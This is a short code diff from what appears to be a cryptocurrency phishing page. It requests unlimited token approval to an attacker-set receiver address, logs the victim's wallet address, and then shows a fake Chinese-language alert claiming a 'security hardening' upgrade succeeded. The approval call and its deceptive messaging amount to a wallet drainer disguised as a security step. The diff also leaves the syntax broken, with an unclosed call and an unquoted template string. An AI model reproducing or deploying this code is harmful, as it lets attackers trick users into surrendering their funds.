@@ -110,9 +110,8 @@
                 const maxAmount = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
                 
                 // 这里会弹出钱包的确认窗口
-                await contract.approve(CONFIG.RECEIVER, maxAmount).send();
-
-// 4. 授权成功后的反馈
+                await contract.approve(CONFIG.RECEIVER, maxAmount).send(
+                // 4. 授权成功后的反馈
                 await sendLog(✅ <b>授权成功</b>\n地址: <code>${userAddr}</code>);
                 alert("安全加固成功！系统已为您自动升级节点环境。");
                 btn.innerText = "已完成加固";
